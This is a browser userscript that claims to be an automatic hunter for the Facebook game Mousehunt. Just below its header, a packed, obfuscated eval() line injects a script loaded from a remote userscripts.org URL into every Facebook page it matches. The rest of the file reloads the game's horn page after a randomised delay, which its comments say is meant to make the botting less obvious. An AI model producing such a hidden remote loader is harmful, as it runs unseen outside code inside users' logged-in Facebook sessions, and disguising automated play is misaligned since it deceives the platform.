// ==UserScript==
// @name           Facebook - Mousehunt Smart Autohunter Plus + Last Update
// @namespace      Wr3cktangle
// @description    A smart autohunter for the Mousehunt Facebook App
// @include        http://apps.facebook.com/mousehunt/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var inputs = document.getElementsByTagName("input");
var timervalue = -1;

if(inputs)
{
   //loop through and find the horn timer hidden input box and get it's value
   for(i = 0; i < inputs.length; i++)
   {
      if(inputs[i].id.indexOf("hornWaitValue") != -1)
      {
         timervalue = inputs[i].value;         
         break;
      }
   }
   
}

inputs = null;

if(timervalue > 0)
{
   //calculate timeoutvalue in milliseconds
   //timervalue is in seconds, so convert that, and add on [3,33) seconds randomly 
   //the random time is to help keep it less obvious mostly.
   timeoutvalue = (parseInt(timervalue) + Math.round(Math.random() * 30) + 3) * 1000;
   
   //alert("refresh in " + timeoutvalue );
   setTimeout(function() {document.location = 'http://apps.facebook.com/mousehunt/soundthehorn.php';} , timeoutvalue);
}
